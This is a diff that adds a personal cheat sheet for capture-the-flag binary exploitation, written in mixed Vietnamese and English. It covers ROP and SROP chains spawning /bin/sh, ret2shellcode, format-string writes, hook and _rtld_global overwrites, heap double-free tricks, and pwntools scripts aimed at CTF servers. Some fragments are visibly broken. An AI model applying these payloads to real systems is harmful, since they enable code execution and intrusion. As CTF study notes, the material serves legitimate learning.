@@ -1,0 +1,296 @@
+README.md:
+	![main.png](images/main.png)
+	[Tên liên kết](đường_dẫn)
+
+
+run docker:
+	[-] docker build -t image_name .
+	[-] docker run --privileged image_name
+	[-] docker run -d --name Dockerfile image_name
+	
+	[-] sudo docker-compose up
+	[-] sudo docker ps
+	[-] docker exec -it <container_id> sh
+	
+	copy file from libc: docker cp <container-id>:/lib/libc.so.6 <local-destination>
+
+====================================================================================================================================================================================
+
+build file c:
+
+	[-] gcc -no-pie -fno-stack-protector -o chall chall.c
+====================================================================================================================================================================================
+
+compile file:
+	[-] nasm -f elf64 -o test.o test.asm
+	[-] ld -m elf_x86_64 -s -o test test.o
+	
+	[-] nasm -f elf32 hello.asm
+	[-] ld -m elf_i386 -s -o hello hello.o
+====================================================================================================================================================================================
+
+ROP_chain:
+	rop = ROP(libc)
+	rop(rax=0x2, rdi=flag_string, rsi=0, rdx=0)
+	rop.raw(syscall)
+
+	rop(rax=0, rdi=3, rsi=flag_string, rdx=0x50)
+	rop.raw(syscall)
+
+	rop(rax=1, rdi=1, rsi=flag_string, rdx=0x50)
+	rop.raw(syscall)
+
+	rop.raw(ret)
+	rop.raw(elf.sym.main)
+
+	p.sendlineafter(b':', b"A"*0x48 + pack(canary) + b"C"*8 + rop.chain())
+
+
+
+	[-] payload = gadget + p64(pop_rdi_ret) + p64(elf.got["puts"]) + p64(elf.plt["puts"])
+	payload += p64(main)
+	[-] 3 tham số trước khi gọi hàm là: rdi, rsi và rdx
+32bit:
+	[-] payload = b'A'*<x>        # Padding
+	payload += p32(<@plt> / libc.sym['<function name>'])
+	payload += p32(<return address>)
+	payload += p32(<arg1>)
+	payload += p32(<arg2>)
+	...
+
+64bit:
+	[-] payload = b'A'*<x>             # Padding
+	payload += p64(pop_rdi)
+	payload += p64(<arg1>)
+	payload += p64(pop_rsi_r15)
+	payload += p64(<arg2>)
+	payload += p64(<any byte>)     # Padding
+	payload += p64(@plt / libc.sym['<function name>'])
+	payload += p32(<return address>)
+
+SROP: 
+	[-] frame = SigreturnFrame()
+	frame.rax = 0x3b            # syscall number for execve
+	frame.rdi = BINSH           # pointer to /bin/sh
+	frame.rsi = 0x0             # NULL
+	frame.rdx = 0x0             # NULL
+	frame.rip = SYSCALL_RET
+
+	payload = b'A' * 8
+	payload += p64(POP_RAX)
+	payload += p64(0xf)
+	payload += p64(SYSCALL_RET)
+	payload += bytes(frame)
+
+====================================================================================================================================================================================
+ret2shellcode:
+	[-] Chạy vùng nhớ không có quyền -x thành có quyền x:
+call mprotect(addr,size,7)
+
+	[-] payload = gadget + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret)
+	    payload += p64(2nd_arg) + p64(0) + p64(pop_rdx_ret) + p64(length_of_shellcode) + p64(read_plt)
+	    payload += p64(read_of_read) 'addr of shellcode'
+	p.sendline(payload)
+	p.sendline(shellcode)
+
+stage2 = asm(("""
+.rept 0x6
+nop
+.endr
+""" 
+    + shellcraft.open('/flag')
+    + shellcraft.read('rax', 'rsp', 0x100)
+    + f"""
+    xor r11, r11
+    xor rax, rax
+"""
+), arch='amd64')
+
+====================================================================================================================================================================================
+
+leak_addr:
+	[-] leak = int.from_bytes(p.recv(6),"little") 
+	[-] leak = int(p.recv(12),16)
+	[-] leak = p.recvline()[:-1]
+ 	    leak = int(decode(canary),16)
+	   #recv  4a3cff7f to 0x7fff3c4a
+
+====================================================================================================================================================================================
+
+formatstring:
+	[-] PRINT@PLT to atoll.got = fmt
+	[-] %123123x
+	[-] %p%p%p%n will write and access easily.
+	[-] %4$n will write but cannot access.
+	[-] Payload should have %c instead %x to make sure it write a byte, not a random byte on stack.
+	[-] Enter "." to scanf() with number format (%d, %u, %ld...) won't enter new value to var.
+	[-] %* works as %d and will print first 4 bytes
+	[-] %*<k>$ works as %<k>$d
+	[-] %*<k>$c will be the pad of   with the size that %<k>c point to
+	[-] %.*<k>$c will be the pad of 0 with the size that %<k>$c point to
+	[-] Format string can be use to modify and read data at the same time just in case you don't use the short format (%<k>$c), use the plain format instead (%p, %n, %s, %c).
+	Example: %c%c%c%c%1234c%hn%6$s to change address and read from that changed address
+
+====================================================================================================================================================================================
+
+hook:
+	[-] print &__malloc_hook
+	    print &__free_hook
+	[-] payload = gadget + p64(free_hook) + p64(OG)
+
+====================================================================================================================================================================================
+
+.fini_array:
+	[-] Search for fini_array_addr: readelf -S ./file
+
+====================================================================================================================================================================================
+_rtld_global:
+	[-] ghi đè (_overwrite) giá trị của con trỏ hàm _dl_fini trong cấu trúc _rtld_global, thì khi hàm _dl_fini được gọi trong quá trình thoát khỏi chương trình, attacker có thể định nghĩa hàm được gọi thay thế, trong đó có chứa mã độc hoặc lệnh shell (system("sh")) | search trên dreamhack
+	[-] rtld_recursive = rtld_global + 3848 # addr of system
+	    rtld_load_lock = rtld_global + 2312 # = 'binsh'
+	[-] One more way is push one_gadget to rtld_recursive
+
+====================================================================================================================================================================================
+
+
+
+Note:
+	[-] điều kiện thực thi system là rsp kết thúc = 0: 0x1231230 (chia hết cho 16)
+	[-] .fini_array:  Khi chương trình kết thúc sẽ nhảy vào .fini_array và đi đến hàm main() tại 0x401b6d, sau đó quay lại hàm FUNC_0x402960, hàm này lại gọi .fini_array một lần nữa, … cứ thế ta có được 1 chương trình lặp lại vô tận và ta có thể overwrite giá trị tại địa chỉ tùy ý nhiều lần.
+
+====================================================================================================================================================================================
+
+
+command_windows: 
+	[-] New-Item a.py -type file
+	   #create new file in windown
+
+
+====================================================================================================================================================================================
+
+
+command_linux:
+	[-] ls -la
+	   #show hidden files
+
+
+====================================================================================================================================================================================
+SKILL:
+
+[+] /proc/self/maps
+[+] ulimit -n 2048
+
+####################################################################################################################################################################################
+Ex script:  nm -D libc.so.6 | grep "__libc_start"
+
+#!/usr/bin/python3
+from pwn import *
+
+elf = context.binary = ELF("chal")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-2.27.so")
+
+local = True 
+if local:
+    p = process("./chal")
+    gdb.attach(p,'''''')
+else:
+    p = remote('chall.pwnable.tw', 10001)
+
+elf = context.binary = ELF('./chal', checksec=False)
+
+info = lambda msg: log.info(msg)
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+
+p.interactive()
+
+elf = context.binary = ELF('./random', checksec=False)
+proc = subprocess.Popen(['./rand'],stdout=subprocess.PIPE)
+####################################################################################################################################################################################
+
+#!/usr/bin/python3
+from pwn import *
+import subprocess #spawm process
+elf = context.binary = ELF('./noleek_patched', checksec=False)
+
+while(1):
+    try:
+        p=remote("challs.actf.co" ,31400)
+        p.recvuntil(b"proof of work: ")
+        foo = p.recvline().decode()
+        print(foo)
+        resultCapcha = subprocess.getoutput(foo)
+        print(resultCapcha)
+        p.sendline(resultCapcha)
+
+        payload = b'%56c%*1$c%13$Ln\n'
+        p.sendafter(b'leek? ', payload)
+        payload = b'%678166c%*12$c%42$Ln\n'
+        p.sendafter(b'more leek? ', payload)
+        p.recvuntil(b'noleek.\n')
+        p.sendline(b'cat /app/flag.txt')
+        p.interactive()
+    except:
+        if (b'actf' in  p.recvall()):
+            break 
+
+=> Loop a lot of time
+
+libc.addr = leak
+payload = flat(
+    libc.sym['system'],
+    addr,
+rop = ROP(libc)
+    next(libc.search(b'/bin/sh'))
+)
+####################################################################################################################################################################################
+When user malloc a chunk whose size is larger than top chunk, the program will call sysmalloc() and free the top chunk into unsorted bin. Then the top chunk fd and bk will point to the address which is relevant with main_arena.
+
+
+heap: 
+	[-] Double_Free
+	create(8,b"A"*8)
+	#create(8,b"A"*8)
+
+	delete(0)
+	delete(0)
+
+	create(8, p64(elf.got['printf']))
+	create(8,b"a"*8)
+	create(8,p64(get_shell))
+
+	[-] fastbin: Lưu địa chỉ của chunk có size cố định theo từng mảng
+	[-] Unsorted bin: Nếu chunk size lớn hơn max size của fastbin => sau khi free thì sẽ lưu vào Unsorted bin
+	[-] Tạo fake chunk: Tìm 1 địa chỉ có 1 bytes thuộc khoảng size của fastbin để làm size data
+	[-] create(0, 0x80, b"1"*0x80) 
+	create(1, 0x80, b"2"*0x80)
+	free(0)
+	=> khi đó địa chỉ của main_area sẽ lưu ở đầu heap chunk. 
+
+
+	[-] No uaf or double free cause the pointer to heap is set NULL after free
+	[-] free that chunk but it do not set NULL the pointer to that chunk on the heap
+	==> use after free bug
+	[-] double free bug cause after delete chunk 0 for example we still got a pointer to that chunk in array store an we can free it again
+
+	[-] con trỏ tcache heap trỏ đến địa chỉ chứa dữ liệu, vì vậy chúng ta có thể ghi đè địa chỉ đó bằng cách sử dụng lỗ hổng double free với _free_hook chính nó thay vì __free_hook -16 như trước.
+
+====================================================================================================================================================================================
+#### Since 2.32 is introduced in the libc the safe-linking mechanism that does some xor encyptions on tcache, fastbin next fp to prevent pointer hiijacking. Here is the core of the mechanism:
+
+// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L340
+/* Safe-Linking:
+   Use randomness from ASLR (mmap_base) to protect single-linked lists
+   of Fast-Bins and TCache.  That is, mask the "next" pointers of the
+   lists' chunks, and also perform allocation alignment checks on them.
+   This mechanism reduces the risk of pointer hijacking, as was done with
+   Safe-Unlinking in the double-linked lists of Small-Bins.
+   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with
+   larger pages provide less entropy, although the pointer mangling
+   still works.  */
+#define PROTECT_PTR(pos, ptr) \
+  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
+#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
